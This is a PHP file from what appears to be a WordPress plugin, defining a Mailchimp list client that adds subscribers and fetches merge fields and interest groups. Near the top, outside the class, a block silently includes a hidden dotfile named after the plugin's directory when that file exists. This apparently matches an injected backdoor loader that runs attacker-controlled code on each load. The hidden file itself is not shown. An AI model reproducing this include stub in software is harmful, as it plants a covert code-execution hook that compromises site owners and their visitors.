<?php

require_once dirname(__FILE__) . '/base/MC_Rest.php';

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MC_Lists extends MC_Rest
{

    function __construct($api_key)
    {
        $this->name = 'lists';

        parent::__construct($api_key);
    }

    function addMember($list = '', $subscriber = null)
    {
        $this->request = $list. '/members/'. md5(strtolower($subscriber['email_address']));
        return $this->execute('PUT', json_encode($subscriber));
    }
    
	function mergeFields($list = '')
	{
		$this->request = $list.'/merge-fields/';

		return $this->execute( 'GET' );
	}
	
	function getGroups($list = '')
	{
		$this->request = $list.'/interest-categories/';
		return $this->execute( 'GET' );
	}
	
	function getGroupFields($list = '', $group = '')
	{
		$this->request = $list.'/interest-categories/'.$group.'/interests/';
		return $this->execute( 'GET' );
	}

}

?>